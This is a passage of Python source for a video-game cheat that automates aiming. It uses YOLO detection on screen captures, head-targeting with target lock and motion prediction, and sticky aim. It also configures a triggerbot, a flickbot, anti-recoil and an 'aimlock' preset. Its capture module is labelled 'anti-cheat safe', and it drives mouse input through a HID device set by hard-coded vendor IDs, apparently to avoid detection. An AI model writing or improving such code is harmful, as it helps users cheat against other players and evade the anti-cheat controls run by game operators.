
        # Create overlay config bridge
        self.overlay_cfg = OverlayConfigBridge(self.config_manager)
        
        # Initialize overlay
        self.overlay = Overlay(self.overlay_cfg)
        
        # Register for config updates
        self.config_manager.register_callback(self.on_config_updated)
        self.load_current_config()

        # Setup debug window
        self.setup_debug_window()

        self.target_lock = {
            'enabled': True,
            'current_target_id': None,
            'lock_time': 0,
            'min_lock_duration': 0.5,  # Minimum time to lock onto a target
            'max_lock_duration': 3.0,  # Maximum time before forcing target switch
            'distance_threshold': 100,  # Max distance target can move before lock breaks
            'last_target_position': None,
            'target_lost_time': 0,
            'reacquire_timeout': 0.3  # Time to wait before switching targets after losing one
        }
        
        # Load target lock config
        self.load_target_lock_config()

    def load_anti_recoil_config(self):
        """Load anti-recoil settings from config"""
        config = self.config_manager.get_config()
        anti_recoil_config = config.get('anti_recoil', {})
    
        self.anti_recoil.enabled = anti_recoil_config.get('enabled', False)
        self.anti_recoil.strength = anti_recoil_config.get('strength', 5.0)
        self.anti_recoil.reduce_bloom = anti_recoil_config.get('reduce_bloom', True)
        self.anti_recoil.require_target = anti_recoil_config.get('require_target', True)
        self.anti_recoil.require_keybind = anti_recoil_config.get('require_keybind', True)

    def initialize_target_tracker(self):
        """Initialize the target tracker"""
        self.target_tracker = TargetTracker()
    
        # Enhanced target lock configuration
        self.target_lock = {
            'enabled': True,
            'current_target_id': None,
            'lock_time': 0,
            'min_lock_duration': 0.8,
            'max_lock_duration': 5.0,
            'distance_threshold': 150,
            'last_target_position': None,
            'target_lost_time': 0,
            'reacquire_timeout': 0.5,
            'switch_threshold': 0.7,  # Target must be 30% closer to switch
            'target_velocity': (0, 0),  # Track target velocity
            'lock_strength': 1.0,  # How strongly to maintain lock (1.0 = full lock)
            'prediction_enabled': True,
            'sticky_radius': 50,  # Pixels around target to maintain sticky aim
        }

    def load_target_lock_config(self):
        """Load target lock settings from config"""
        config = self.config_manager.get_config()
        target_lock_config = config.get('target_lock', {})
        
        self.target_lock['enabled'] = target_lock_config.get('enabled', True)
        self.target_lock['min_lock_duration'] = target_lock_config.get('min_lock_duration', 0.5)
        self.target_lock['max_lock_duration'] = target_lock_config.get('max_lock_duration', 3.0)
        self.target_lock['distance_threshold'] = target_lock_config.get('distance_threshold', 100)
        self.target_lock['reacquire_timeout'] = target_lock_config.get('reacquire_timeout', 0.3)

    def find_closest_target_with_enhanced_lock(self, results):
        """Enhanced target locking with prediction and sticky aim"""
        if not self.target_lock['enabled']:
            return self.find_closest_target(results)
    
        current_time = time.time()
        targets = []
        fov_half = self.fov // 2
    
        # Clean up old tracked targets
        self.target_tracker.cleanup_old_targets(current_time)
    
        # Process detected targets
        for i, box in enumerate(results[0].boxes):
            x1, y1, x2, y2 = box.xyxy[0]
            height = y2 - y1
            width = x2 - x1
            head_x = (x1 + x2) / 2
            head_y = y1 + (height * (100 - self.aim_height) / 100)
        
            if x1 < 15 or x1 < self.fov / 5 or y2 > self.fov / 1.2:
                continue
        
            # Create stable ID based on position and size
            target_id = self.generate_stable_target_id(x1, y1, x2, y2)
        
            # Update tracker
            self.target_tracker.update_target(target_id, (head_x, head_y), current_time)
        
            dist = math.sqrt((head_x - fov_half) ** 2 + (head_y - fov_half) ** 2)
        
            targets.append({
                'id': target_id,
                'index': i,
                'position': (head_x, head_y),
                'distance': dist,
                'box': box,
                'bbox': (x1, y1, x2, y2),
                'confidence': box.conf[0].cpu().numpy() if hasattr(box.conf[0], 'cpu') else box.conf[0],
                'area': width * height
            })
    
        # Handle locked target
        if self.target_lock['current_target_id']:
            locked_target = self.find_locked_target_match(targets, current_time)
        
            if locked_target:
                # Check if we should maintain lock
                if self.should_maintain_lock(locked_target, targets, current_time):
                    # Apply prediction if enabled
                    if self.target_lock['prediction_enabled']:
                        predicted_pos = self.target_tracker.predict_position(
                            locked_target['id'], 
                            current_time + 0.016  # Predict 1 frame ahead (60fps)
                        )
                        if predicted_pos:
                            return predicted_pos
                
                    return locked_target['position']
                else:
                    # Switch to better target
                    self.clear_target_lock()
    
        # Acquire new target if needed
        if targets and not self.target_lock['current_target_id']:
            selected = self.select_best_target(targets)
            if selected:
                self.lock_onto_target(selected, current_time)
                return selected['position']
    
        return None

    def generate_stable_target_id(self, x1, y1, x2, y2):
        """Generate a stable ID for target tracking"""
        # Round positions to reduce jitter
        grid_size = 10
        x1_rounded = int(x1 / grid_size) * grid_size
        y1_rounded = int(y1 / grid_size) * grid_size
        x2_rounded = int(x2 / grid_size) * grid_size
        y2_rounded = int(y2 / grid_size) * grid_size
    
        return f"{x1_rounded}_{y1_rounded}_{x2_rounded}_{y2_rounded}"

    def find_locked_target_match(self, targets, current_time):
        """Find the locked target with improved matching"""
        if not self.target_lock['last_target_position']:
            return None
    
        last_x, last_y = self.target_lock['last_target_position']
    
        # Use prediction to estimate where target should be
        if self.target_lock['prediction_enabled']:
            predicted_pos = self.target_tracker.predict_position(
                self.target_lock['current_target_id'], 
                current_time
            )
            if predicted_pos:
                last_x, last_y = predicted_pos
    
        # Find best matching target
        best_match = None
        best_score = float('inf')
    
        for target in targets:
            curr_x, curr_y = target['position']
        
            # Calculate match score (lower is better)
            position_dist = math.sqrt((curr_x - last_x) ** 2 + (curr_y - last_y) ** 2)
        
            # Give bonus to targets with similar confidence
            confidence_diff = 0
            if hasattr(self.target_lock, 'last_confidence'):
                confidence_diff = abs(target['confidence'] - self.target_lock.get('last_confidence', 0.5)) * 50
        
            score = position_dist + confidence_diff
        
            # Must be within threshold to be considered
            if position_dist < self.target_lock['distance_threshold'] and score < best_score:
                best_match = target
                best_score = score
    
        if best_match:
            # Update lock with new target info
            self.target_lock['last_confidence'] = best_match['confidence']
    
        return best_match

    def should_maintain_lock(self, locked_target, all_targets, current_time):
        """Determine if we should maintain the current lock"""
        lock_duration = current_time - self.target_lock['lock_time']
    
        # Always maintain lock during minimum duration
        if lock_duration < self.target_lock['min_lock_duration']:
            return True
    
        # Check if exceeded maximum duration
        if lock_duration > self.target_lock['max_lock_duration']:
            # Find best alternative
            best_alternative = min(all_targets, key=lambda x: x['distance'])
        
            # Only switch if alternative is significantly better
            if best_alternative['distance'] < locked_target['distance'] * self.target_lock['switch_threshold']:
                return False
    
        # Check sticky aim radius
        if self.target_lock.get('sticky_radius', 50) > 0:
            fov_center = self.fov // 2
            dist_from_center = math.sqrt(
                (locked_target['position'][0] - fov_center) ** 2 + 
                (locked_target['position'][1] - fov_center) ** 2
            )
        
            # If target is very close to crosshair, maintain strong lock
            if dist_from_center < self.target_lock['sticky_radius']:
                self.target_lock['lock_strength'] = 1.0
                return True
    
        return True

    def select_best_target(self, targets):
        """Select the best target based on multiple factors"""
        if not targets:
            return None
    
        preference = self.config_manager.get_value('target_lock.preference', 'closest')
    
        # Score each target
        for target in targets:
            score = 0
        
            # Distance score (closer is better)
            max_dist = math.sqrt(self.fov ** 2 + self.fov ** 2)
            dist_score = 1.0 - (target['distance'] / max_dist)
            score += dist_score * 0.5
        
            # Confidence score
            score += target['confidence'] * 0.3
        
            # Size score (larger targets are easier to track)
            max_area = self.fov * self.fov
            size_score = target['area'] / max_area
            score += size_score * 0.2
        
            target['score'] = score
    
        # Apply preference weighting
        if preference == 'closest':
            return min(targets, key=lambda x: x['distance'])
        elif preference == 'confidence':
            return max(targets, key=lambda x: x['confidence'])
        elif preference == 'largest':
            return max(targets, key=lambda x: x['area'])
        else:
            # Use combined score
            return max(targets, key=lambda x: x['score'])

    def lock_onto_target(self, target, current_time):
        """Lock onto a new target"""
        self.target_lock['current_target_id'] = target['id']
        self.target_lock['lock_time'] = current_time
        self.target_lock['last_target_position'] = target['position']
        self.target_lock['last_confidence'] = target['confidence']
        self.target_lock['target_lost_time'] = 0
        self.target_lock['lock_strength'] = 1.0

    def find_closest_target_with_lock(self, results):
        """Find closest target with improved locking logic"""
        if not self.target_lock['enabled']:
            # Use original logic if locking is disabled
            return self.find_closest_target(results)
    
        current_time = time.time()
        targets = []
        fov_half = self.fov // 2
    
        # Collect all valid targets with their IDs
        for i, box in enumerate(results[0].boxes):
            x1, y1, x2, y2 = box.xyxy[0]

            # Convert tensors to float if needed
            if hasattr(x1, 'item'):
                x1, y1, x2, y2 = x1.item(), y1.item(), x2.item(), y2.item()

            height = y2 - y1
            width = x2 - x1
            head_x = (x1 + x2) / 2
            head_y = y1 + (height * (100 - self.aim_height) / 100)
        
            # Only skip if completely outside FOV
            if head_x < 0 or head_x > self.fov or head_y < 0 or head_y > self.fov:
                continue

            # Skip tiny detections
            if width < 5 or height < 5:
                continue
        
            dist = math.sqrt((head_x - fov_half) ** 2 + (head_y - fov_half) ** 2)
        
            # Calculate a unique ID based on position and size (more stable than index)
            # This helps track the same target even if detection order changes
            target_id = f"{int(x1)}_{int(y1)}_{int(x2)}_{int(y2)}"
        
            targets.append({
                'id': target_id,
                'index': i,
                'position': (head_x, head_y),
                'distance': dist,
                'box': box,
                'bbox': (x1, y1, x2, y2)
            })
    
        if not targets:
            # No targets found - but don't wait if we recently lost the target
            if self.target_lock['current_target_id'] is not None:
                if self.target_lock['target_lost_time'] == 0:
                    self.target_lock['target_lost_time'] = current_time
            
                # Instead of returning None during reacquire timeout,
                # immediately look for a new target if timeout is short
                if current_time - self.target_lock['target_lost_time'] > 0.1:  # Reduced from reacquire_timeout
                    self.clear_target_lock()
            return None
    
        # Check if we have a locked target
        if self.target_lock['current_target_id'] is not None:
            locked_target = None
        
            # Try to find the locked target by matching position/size
            if self.target_lock['last_target_position']:
                last_x, last_y = self.target_lock['last_target_position']
            
                # Find the target that's closest to the last known position
                best_match = None
                best_match_dist = float('inf')
            
                for target in targets:
                    curr_x, curr_y = target['position']
                    position_dist = math.sqrt((curr_x - last_x) ** 2 + (curr_y - last_y) ** 2)
                
                    # Consider this the same target if it's within the distance threshold
                    if position_dist < self.target_lock['distance_threshold']:
                        if position_dist < best_match_dist:
                            best_match = target
                            best_match_dist = position_dist
            
                # Use a more lenient distance threshold
                if best_match and best_match_dist < self.target_lock['distance_threshold']:
                    locked_target = best_match
                    self.target_lock['current_target_id'] = locked_target['id']
                    self.target_lock['target_lost_time'] = 0  # Reset lost time
        
            # If we found our locked target, stick with it
            if locked_target:
                lock_duration = current_time - self.target_lock['lock_time']
            
                # Only switch targets if:
                # 1. We've exceeded max lock duration
                # 2. AND there's a significantly closer target (at least 30% closer)
                if lock_duration > self.target_lock['max_lock_duration']:
                    # Check if there's a much better target
                    closest_target = min(targets, key=lambda x: x['distance'])
                
                    # Only switch if the new target is significantly closer
                    if closest_target['distance'] < locked_target['distance'] * 0.7:
                        # Switch to the closer target
                        self.target_lock['current_target_id'] = closest_target['id']
                        self.target_lock['lock_time'] = current_time
                        self.target_lock['last_target_position'] = closest_target['position']
                        self.target_lock['target_lost_time'] = 0
                        return closest_target['position']
                    else:
                        # Reset lock timer but keep the same target
                        self.target_lock['lock_time'] = current_time
            
                # Maintain lock on current target
                self.target_lock['last_target_position'] = locked_target['position']
                self.target_lock['target_lost_time'] = 0
                return locked_target['position']
            else:
                self.clear_target_lock()
    
        # Need to acquire new target (either no lock or lock was cleared)
        if targets:
            # Smart target selection based on preference
            preference = self.config_manager.get_value('target_lock.preference', 'closest')
        
            if preference == 'closest':
                # Sort by distance and get closest
                targets.sort(key=lambda x: x['distance'])
                selected = targets[0]
            elif preference == 'centered':
                # Get most centered target
                selected = min(targets, key=lambda x: x['distance'])
            elif preference == 'largest':
                # Get largest target (by bounding box area)
                def get_area(t):
                    x1, y1, x2, y2 = t['bbox']
                    return (x2 - x1) * (y2 - y1)
                selected = max(targets, key=get_area)
            elif preference == 'confidence':
                # Get highest confidence target
                selected = max(targets, key=lambda x: x['box'].conf[0])
            else:
                # Default to closest
                targets.sort(key=lambda x: x['distance'])
                selected = targets[0]
        
            # Lock onto new target
            self.target_lock['current_target_id'] = selected['id']
            self.target_lock['lock_time'] = current_time
            self.target_lock['last_target_position'] = selected['position']
            self.target_lock['target_lost_time'] = 0
        
            return selected['position']
    
        return None
    
    def clear_target_lock(self):
        """Clear the current target lock"""
        self.target_lock['current_target_id'] = None
        self.target_lock['lock_time'] = 0
        self.target_lock['last_target_position'] = None
        self.target_lock['target_lost_time'] = 0

    def load_target_lock_config(self):
        """Load target lock settings from config with improved defaults"""
        config = self.config_manager.get_config()
        target_lock_config = config.get('target_lock', {})
    
        # Use better defaults for more stable locking
        self.target_lock['enabled'] = target_lock_config.get('enabled', True)
        self.target_lock['min_lock_duration'] = target_lock_config.get('min_lock_duration', 0.8)  # Increased from 0.5
        self.target_lock['max_lock_duration'] = target_lock_config.get('max_lock_duration', 5.0)  # Increased from 3.0
        self.target_lock['distance_threshold'] = target_lock_config.get('distance_threshold', 150)  # Increased from 100
        self.target_lock['reacquire_timeout'] = target_lock_config.get('reacquire_timeout', 0.5)  # Increased from 0.3
        self.target_lock['preference'] = target_lock_config.get('preference', 'closest')
    
        # Add new settings for better control
        self.target_lock['sticky_aim'] = target_lock_config.get('sticky_aim', True)
        self.target_lock['require_visibility'] = target_lock_config.get('require_visibility', True)
        self.target_lock['switch_threshold'] = target_lock_config.get('switch_threshold', 0.7)  # How much closer a target needs to be to switch (0.7 = 30% closer)
    
    def load_current_config(self):
        """Load current configuration into runtime variables"""
        config = self.config_manager.get_config()
        self.fov = config.get('fov', 320)
        self.sensitivity = config.get('sensitivity', 1.0)
        self.aim_height = config.get('aim_height', 50)
        self.confidence = config.get('confidence', 0.3)
        self.keybind = config.get('keybind', "0x02")
        self.mouse_method = config.get('mouse_method', "hid")
        self.custom_resolution = config.get('custom_resolution', {})
        self.show_overlay = config.get('show_overlay', True)
        self.overlay_shape = config.get('overlay_shape', 'circle')
        self.visuals_enabled = config.get('show_debug_window', False)

        # Load mouse FOV settings (NEW)
        mouse_fov_config = config.get('mouse_fov', {})
        self.mouse_fov_width = mouse_fov_config.get('mouse_fov_width', 15)
        self.mouse_fov_height = mouse_fov_config.get('mouse_fov_height', 12)
        self.use_separate_fov = mouse_fov_config.get('use_separate_fov', False)
        self.dpi = config.get('dpi', 1100)
        self.mouse_sensitivity = config.get('mouse_sensitivity', 1.0)

        # *** NEW: Load movement curve settings ***
        movement_config = config.get('movement', {
            'use_curves': False,
            'curve_type': 'Bezier',
            'movement_speed': 1.0,
            'smoothing_enabled': True,
            'random_curves': False
        })
        
        self.use_movement_curves = movement_config.get('use_curves', False)
        self.movement_curve_type = movement_config.get('curve_type', 'Bezier')
        self.movement_speed = movement_config.get('movement_speed', 1.0)
        self.curve_smoothing = movement_config.get('smoothing_enabled', True)
        self.random_curves = movement_config.get('random_curves', False)
        
        # Update movement curves configuration
        self.movement_curves.set_curve_type(self.movement_curve_type)
        
        # Load Kalman configuration
        self.kalman_config = config.get('kalman', {
            "use_kalman": True,
            "kf_p": 38.17,
            "kf_r": 2.8,
            "kf_q": 28.11,
            "kalman_frames_to_predict": 1.5
        })
        self.use_kalman = self.kalman_config.get('use_kalman', True)
        self.kalman_frames_to_predict = self.kalman_config.get('kalman_frames_to_predict', 1.5)
        
        # Update screen dimensions
        if self.custom_resolution.get('use_custom_resolution', False):
            self.full_x = self.custom_resolution.get('x', 1920)
            self.full_y = self.custom_resolution.get('y', 1080)
        else:
            self.full_x = windll.user32.GetSystemMetrics(0)
            self.full_y = windll.user32.GetSystemMetrics(1)
        
        self.center_x = self.full_x // 2
        self.center_y = self.full_y // 2

        # Update overlay shape if overlay exists
        if self.overlay:
            self.overlay.set_shape(self.overlay_shape)

    def calc_movement(self, target_x, target_y):
        """Calculate movement with mouse FOV adjustments"""

        # --- 1. Offsets from screen centre ---
        left = (self.full_x - self.fov) // 2
        top = (self.full_y - self.fov) // 2

        offset_x = target_x - (self.fov // 2)
        offset_y = target_y - (self.fov // 2)

        # --- 2. Degrees‑per‑pixel scale ---
        if self.use_separate_fov:
            degrees_per_pixel_x = self.mouse_fov_width / self.fov
            degrees_per_pixel_y = self.mouse_fov_height / self.fov
        else:
            degrees_per_pixel_x = self.mouse_fov_width / self.fov
            degrees_per_pixel_y = self.mouse_fov_width / self.fov

        # --- 3. Raw movement in “degrees” ---
        mouse_move_x = offset_x * degrees_per_pixel_x
        mouse_move_y = offset_y * degrees_per_pixel_y

        # --- 4. Optional pre‑smoothing ---
        if self.use_kalman:
            alpha = self.kalman_config.get('alpha_with_kalman', 1.5)
        else:
            alpha = 0.3

        if not hasattr(self, 'last_move_x'):
            self.last_move_x, self.last_move_y = 0.0, 0.0

        move_x = alpha * mouse_move_x + (1 - alpha) * self.last_move_x
        move_y = alpha * mouse_move_y + (1 - alpha) * self.last_move_y

        self.last_move_x, self.last_move_y = move_x, move_y

        # --- 5. Convert to mouse movement units ---
        move_x = (move_x / 360) * (self.dpi * (1 / self.mouse_sensitivity)) * self.sensitivity
        move_y = (move_y / 360) * (self.dpi * (1 / self.mouse_sensitivity)) * self.sensitivity

        return move_x, move_y



    def load_controller_config(self):
        """Load controller settings from config"""
        config = self.config_manager.get_config()
        controller_config = config.get('controller', {})
    
        self.controller_enabled = controller_config.get('enabled', False)
        self.controller.enabled = self.controller_enabled
        self.controller.sensitivity_multiplier = controller_config.get('sensitivity', 1.0)
        self.controller.deadzone = controller_config.get('deadzone', 0.15)
        self.controller.trigger_threshold = controller_config.get('trigger_threshold', 0.5)
        self.controller.aim_stick = controller_config.get('aim_stick', 'right')
        self.controller.activation_button = controller_config.get('activation_button', 'right_trigger')
        self.controller.hold_to_aim = controller_config.get('hold_to_aim', True)

    def load_triggerbot_config(self):
        """Load triggerbot settings from config"""
        config = self.config_manager.get_config()
    
        # Ensure we get a dictionary, not a boolean
        triggerbot_config = config.get('triggerbot', {})
        if not isinstance(triggerbot_config, dict):
            triggerbot_config = {}
    
        self.triggerbot.enabled = triggerbot_config.get('enabled', False)
        self.triggerbot.confidence_threshold = triggerbot_config.get('confidence', 0.5)
        self.triggerbot.fire_delay = triggerbot_config.get('fire_delay', 0.05)
        self.triggerbot.cooldown = triggerbot_config.get('cooldown', 0.1)
        self.triggerbot.require_aimbot_key = triggerbot_config.get('require_aimbot_key', False)
        self.triggerbot.keybind = triggerbot_config.get('keybind', 0x02)
        self.triggerbot.rapid_fire = triggerbot_config.get('rapid_fire', True)
        self.triggerbot.shots_per_burst = triggerbot_config.get('shots_per_burst', 1)

    def load_flickbot_config(self):
        """Load flickbot settings from config"""
        config = self.config_manager.get_config()
    
        # Ensure we get a dictionary, not a boolean
        flickbot_config = config.get('flickbot', {})
        if not isinstance(flickbot_config, dict):
            flickbot_config = {}
    
        self.flickbot.enabled = flickbot_config.get('enabled', False)
        self.flickbot.smooth_flick = flickbot_config.get('smooth_flick', False)
        self.flickbot.flick_speed = flickbot_config.get('flick_speed', 0.8)
        self.flickbot.flick_delay = flickbot_config.get('flick_delay', 0.05)
        self.flickbot.cooldown = flickbot_config.get('cooldown', 1.0)
        self.flickbot.keybind = flickbot_config.get('keybind', 0x05)
        self.flickbot.auto_fire = flickbot_config.get('auto_fire', True)
        self.flickbot.return_to_origin = flickbot_config.get('return_to_origin', True)

    def set_config_app(self, config_app):
        """Set reference to ConfigApp for menu toggling"""
        self.config_app_reference = config_app

    def reload_model(self):
        """Reload the model with new settings"""
        try:
            print("[+] Reloading model...")
            
            # Store the current running state
            was_running = self.running
            
            # Stop if running
            if was_running:
                self.stop()
                # Wait for thread to fully stop
                time.sleep(0.5)
            
            # Clear old model
            if self.model:
                del self.model
                self.model = None
                # Force garbage collection to free memory
                import gc
                gc.collect()
            
            # Get new model path from config manager
            model_path = self.config_manager.get_model_for_loading()
            
            if not model_path:
                raise Exception("No models found in directory")
            
            # Load the new model
            print(f"[+] Loading model: {model_path}")
            self.model = YOLO(model_path, task="detect", verbose=False)
            
            # Update config with loaded model path
            self.config_manager.set_value("model.model_path", model_path)
            
            # Apply model-specific overrides
            confidence_override = self.config_manager.get_model_specific_confidence()
            if confidence_override is not None:
                self.confidence = confidence_override
                #print(f"[+] Using model-specific confidence: {confidence_override}")
            
            iou_override = self.config_manager.get_model_specific_iou()
            if iou_override is not None:
                self.iou = iou_override
                #print(f"[+] Using model-specific IOU: {iou_override}")
            
            # Warm up the model
            if self.camera:
                frame = self.camera.grab()
                if frame is not None:
                    self.model.predict(frame, conf=self.confidence, iou=0.1, verbose=False)
            
            print(f"[+] Model reloaded successfully")
            
            # Restart if was running
            if was_running:
                self.start()
            
            return True
            
        except Exception as e:
            print(f"[-] Error reloading model: {e}")
            # Try to restore previous state if something went wrong
            if was_running and not self.running:
                try:
                    self.start()
                except:
                    pass
            return False

    def setup_debug_window(self):
        """Setup compact debug window"""
        # Create compact config for debug window
        debug_cfg = type('DebugConfig', (), {
            'show_window': self.visuals_enabled,
            'show_window_fps': True,
            'detection_window_width': 320,
            'detection_window_height': 320,
            'debug_window_name': 'Solana',
            'debug_window_scale_percent': 100,
            'debug_window_always_on_top': True,
            'spawn_window_pos_x': 100,
            'spawn_window_pos_y': 100
        })()
        
        if self.visuals_enabled:
            self.visuals = CompactVisuals(debug_cfg)
            #print(f"[+] Debug window configured")
    
    def on_config_updated(self, new_config: Dict[str, Any]):
        """Called when configuration is updated"""
        # Update runtime variables
        old_fov = self.fov
        old_method = self.mouse_method
        old_show_overlay = self.show_overlay
        old_overlay_shape = self.overlay_shape
        old_visuals_enabled = getattr(self, 'visuals_enabled', False)
        old_movement_curves = getattr(self, 'use_movement_curves', False)
        old_curve_type = getattr(self, 'movement_curve_type', 'Bezier')
        old_kalman_config = self.kalman_config.copy()
        old_confidence = self.confidence
        old_anti_recoil_enabled = self.anti_recoil.enabled
        self.load_anti_recoil_config()
        self.load_triggerbot_config()
        self.load_flickbot_config()
        old_controller_enabled = self.controller_enabled
        self.load_controller_config()
        
        self.load_current_config()

        new_confidence = self.config_manager.get_model_specific_confidence()
        if new_confidence is not None and new_confidence != old_confidence:
            self.confidence = new_confidence
            #print(f"[+] Model-specific confidence updated: {self.confidence}")

        if self.running:
            if old_controller_enabled != self.controller_enabled:
                if self.controller_enabled:
                    self.controller.enabled = True
                    self.controller.start()
                else:
                    self.controller.stop()
                    self.controller.enabled = False

        if self.running and self.mouse_method.lower() == "hid":
            if old_anti_recoil_enabled != self.anti_recoil.enabled:
                if self.anti_recoil.enabled:
                    self.anti_recoil.start()
                else:
                    self.anti_recoil.stop()

        # Check if movement curve settings changed
        if old_movement_curves != self.use_movement_curves:
            print(f"[+] Movement curves {'enabled' if self.use_movement_curves else 'disabled'}")
        
        if old_curve_type != self.movement_curve_type:
            print(f"[+] Movement curve type changed to: {self.movement_curve_type}")

        # Check if overlay shape changed
        if old_overlay_shape != self.overlay_shape:
            #print(f"[+] Overlay shape changed from {old_overlay_shape} to {self.overlay_shape}")
            # Wait a bit before updating to ensure any current operations complete
            time.sleep(0.1)
            self.update_overlay_shape()

        # Check if debug window setting changed
        if old_visuals_enabled != self.visuals_enabled:
            if self.visuals_enabled:
                self.start_debug_window()
            else:
                self.stop_debug_window()
        
        # Check if Kalman settings changed
        if old_kalman_config != self.kalman_config and self.smoother:
            print("[+] Smoothing configuration changed, updating smoother...")
            # The smoother will be updated automatically via its callback
        
        # Check if we need to reinitialize components
        if self.running:
            if old_fov != self.fov or old_method != self.mouse_method:
                #print(f"[+] Critical settings changed, reinitializing components...")
                self.reinitialize_components()
        
        # Handle overlay visibility changes
        if old_show_overlay != self.show_overlay:
            if self.show_overlay:
                self.start_overlay()
            else:
                self.stop_overlay()
        
        # If overlay is running and FOV changed, restart it with new dimensions
        if self.overlay_initialized and old_fov != self.fov:
            time.sleep(0.1)  # Brief pause
            self.stop_overlay()
            time.sleep(0.2)  # Ensure clean shutdown
            self.start_overlay()

    # *** NEW: Movement curve methods ***
    def get_supported_curves(self):
        """Get list of supported movement curves"""
        return self.movement_curves.get_supported_curves()
    
    def set_movement_curve_type(self, curve_type: str):
        """Set the movement curve type"""
        if self.movement_curves.set_curve_type(curve_type):
            self.movement_curve_type = curve_type
            # Update config
            movement_config = self.config_manager.get_config().get('movement', {})
            movement_config['curve_type'] = curve_type
            self.config_manager.update_config({'movement': movement_config})
            print(f"[+] Movement curve set to: {curve_type}")
            return True
        return False
    
    def toggle_movement_curves(self):
        """Toggle movement curves on/off"""
        self.use_movement_curves = not self.use_movement_curves
        # Update config
        movement_config = self.config_manager.get_config().get('movement', {})
        movement_config['use_curves'] = self.use_movement_curves
        self.config_manager.update_config({'movement': movement_config})
        print(f"[+] Movement curves {'enabled' if self.use_movement_curves else 'disabled'}")

    def set_curve_speed_preset(self, preset: str):
        """Set curve speed preset: 'aimlock', 'fast', 'medium', 'slow'"""
        presets = {
            'aimlock': {
                'movement_speed': 5.0,
                'smoothing_factor': 0.05,
                'curve_steps': 3,
                'curve_type': 'Exponential'
            },
            'fast': {
                'movement_speed': 3.0,
                'smoothing_factor': 0.1,
                'curve_steps': 5,
                'curve_type': 'Bezier'
            },
            'medium': {
                'movement_speed': 1.5,
                'smoothing_factor': 0.2,
                'curve_steps': 10,
                'curve_type': 'Sine'
            },
            'slow': {
                'movement_speed': 0.8,
                'smoothing_factor': 0.3,
                'curve_steps': 20,
                'curve_type': 'Catmull'
            }
        }
    
        if preset in presets:
            settings = presets[preset]
            movement_config = self.config_manager.get_movement_config()
            movement_config.update(settings)
            self.config_manager.update_movement_config(movement_config)
            print(f"[+] Curve speed set to: {preset}")
        else:
            print(f"[-] Unknown preset: {preset}")


    def optimize_for_speed(self):
        """Optimize all settings for maximum speed while using curves"""
        # Movement settings
        movement_config = {
            "use_curves": True,
            "curve_type": "Exponential",
            "movement_speed": 5.0,
            "smoothing_enabled": True,
            "smoothing_factor": 0.05,
            "random_curves": False,
            "curve_steps": 3,
            "bezier_control_randomness": 0.05,
            "exponential_decay": 4.0
        }
        self.config_manager.update_movement_config(movement_config)
    
        # Kalman settings for speed
        kalman_config = {
            "use_kalman": True,
            "kf_p": 20.0,  # Lower for more responsive
            "kf_r": 1.5,   # Lower for more direct
            "kf_q": 15.0,  # Lower for less prediction
            "kalman_frames_to_predict": 0.5  # Minimal prediction
        }
        self.config_manager.update_kalman_config(kalman_config)
    
        # Update sensitivity
        self.config_manager.set_value("sensitivity", 2.0)
    
        print("[+] Settings optimized for maximum speed with curves")

    def start_debug_window(self):
        """Start the debug window"""
        if not self.visuals_enabled:
            return
            
        # Always create a new instance to avoid thread reuse issues
        if self.visuals:
            self.visuals.stop_visuals()
            
        self.setup_debug_window()
        
        if self.visuals:
            self.visuals.start_visuals()

    def stop_debug_window(self):
        """Stop the debug window"""
        if self.visuals:
            self.visuals.stop_visuals()

    def update_overlay_shape(self):
        """Update overlay shape without restarting the overlay"""
        if self.overlay:
            try:
                self.overlay.set_shape(self.overlay_shape)
                #print(f"[+] Overlay shape updated to: {self.overlay_shape}")
                
                # If overlay is currently running, restart it to apply the new shape
                if self.overlay_initialized:
                    #print("[+] Restarting overlay to apply new shape...")
                    self.stop_overlay()
                    time.sleep(0.2)  # Increased pause to ensure clean shutdown
                    self.start_overlay()
                    
            except Exception as e:
                print(f"[-] Error updating overlay shape: {e}")

    def get_overlay_dimensions(self):
        """Get overlay dimensions based on shape"""
        if self.overlay_shape == "circle":
            # For circle, use square dimensions
            return self.fov, self.fov
        else:  # square
            # For square, you might want different dimensions
            # or keep it square for consistency
            return self.fov, self.fov
        
    def reinitialize_components(self):
        """Reinitialize camera and mouse with new settings"""
        try:
            # Reinitialize camera with new FOV
            if self.camera:
                left = (self.full_x - self.fov) // 2
                top = (self.full_y - self.fov) // 2
                
                # Release old camera
                self.camera.release()
                
                # Create new camera with updated settings
                self.camera = StealthCapture(fov=self.fov, left=left, top=top)
                print(f"[+] Anti-cheat safe capture reinitialized with FOV: {self.fov}")
            
            # Reinitialize mouse if method changed
            if self.mouse_method.lower() == "hid":
                ensure_mouse_connected()
            
        except Exception as e:
            print(f"[-] Error reinitializing components: {e}")
    
    def initialize_components(self):
        """Initialize Solana components with model selection"""
        try:
            # Initialize Kalman smoother with config manager
            self.smoother = KalmanSmoother(self.config_manager)
            
            # Only initialize model if it hasn't been loaded yet
            if self.model is None:
                # Get model path from config manager
                model_path = self.config_manager.get_model_for_loading()
                
                if not model_path:
                    raise Exception("No models found in directory")
                
                # Load the selected model
                print(f"[+] Loading model: {model_path}")
                self.model = YOLO(model_path, task="detect", verbose=False)
                
                # Update config with loaded model path
                self.config_manager.set_value("model.model_path", model_path)
                
                # Get model-specific overrides
                confidence_override = self.config_manager.get_model_specific_confidence()
                if confidence_override is not None:
                    self.confidence = confidence_override
                
                iou_override = self.config_manager.get_model_specific_iou()
                if iou_override is not None:
                    self.iou = iou_override
            
            # Initialize anti-cheat safe camera
            left = (self.full_x - self.fov) // 2
            top = (self.full_y - self.fov) // 2
            
            self.camera = StealthCapture(fov=self.fov, left=left, top=top)
            print("[+] Anti-cheat safe capture started")
            
            # Initialize mouse if using HID
            if self.mouse_method.lower() == "hid":
                self.initialize_mouse()
            
            # Warm up the model
            frame = self.camera.grab()
            if frame is not None:
                self.model.predict(frame, conf=self.confidence, iou=0.1, verbose=False)
            
            print(f"[+] All components initialized successfully")
            
        except Exception as e:
            print(f"[-] Error initializing components: {e}")
            raise

    def get_current_model_info(self):
        """Get information about the currently loaded model"""
        model_path = self.config_manager.get_value("model.model_path", "Not loaded")
        
        if model_path != "Not loaded" and self.model is not None:
            return {
                "loaded": True,
                "path": model_path,
                "name": os.path.basename(model_path),
                "confidence": self.confidence,
                "iou": getattr(self, 'iou', 0.1)
            }
        else:
            return {
                "loaded": False,
                "path": "Not loaded",
                "name": "None",
                "confidence": self.confidence,
                "iou": 0.1
            }
    
    def initialize_mouse(self):
        """Initialize HID mouse"""
        try:
            VENDOR_ID = 0x46D
            PRODUCT_ID = 0xC539
            get_mouse(VENDOR_ID, PRODUCT_ID)
